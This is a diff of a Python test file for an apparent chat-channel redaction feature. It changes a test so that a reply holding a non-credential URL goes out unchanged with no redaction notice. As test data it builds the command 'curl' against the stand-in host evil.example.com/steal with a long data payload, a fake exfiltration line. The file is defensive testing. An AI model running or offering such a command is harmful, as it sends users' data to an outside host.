@@ -1,6 +1,6 @@
 """A redacted crew-channel reply is followed by the shared redaction notice.
 
-Every channel delivery surface rewrites credentials and suspicious URLs in the
+Every channel delivery surface rewrites credentials (inside a URL or not) in the
 text it ships, and every one of them follows a rewritten reply with the notice
 from ``messaging.renderer.redaction_notice`` so a reader knows a pasted command
 will not run as-is. These tests pin the crew channel onto the same contract:
@@ -22,8 +22,8 @@ from kiro_crew.providers.base import EVENT_COMPLETE, EVENT_TEXT_CHUNK
 
 _SECRET = "SuperSecret123"
 _SECRET_URI = f"postgresql://user:{_SECRET}@db.example.com:5432/prod"
-# A long opaque query payload to an unknown host trips the URL rewriter without
-# carrying a credential-shaped token.
+# A long opaque query payload to an unknown host, carrying no credential-shaped
+# token: no redactor rewrites it.
 _EXFIL_URL = "https://evil.example.com/steal?data=" + "A" * 250
 
 
@@ -77,17 +77,16 @@ async def test_a_reply_with_a_credential_is_followed_by_the_notice():
 
 
 @pytest.mark.asyncio
-async def test_a_reply_with_a_rewritten_url_names_the_url_remedy():
+async def test_a_reply_with_a_url_and_no_credential_posts_no_notice():
+    """A URL is never replaced whole, so a reply whose only link carries no
+    credential is delivered as written and needs no notice."""
     agent, ch = _make_agent(), _make_channel()
 
     await _stream_task(agent, ch, _text_client(f"run: curl '{_EXFIL_URL}'"), "hi")
 
-    assert ch.post.await_count == 2
+    assert ch.post.await_count == 1
     delivered = ch.post.await_args_list[0].args[1]
-    notice = ch.post.await_args_list[1].args[1]
-    assert notice == redaction_notice(*count_redaction_tags(delivered))
-    assert "URL" in notice
-    assert "evil.example.com" not in notice, "the notice must not name the redacted host"
+    assert _EXFIL_URL in delivered
 
 
 @pytest.mark.asyncio
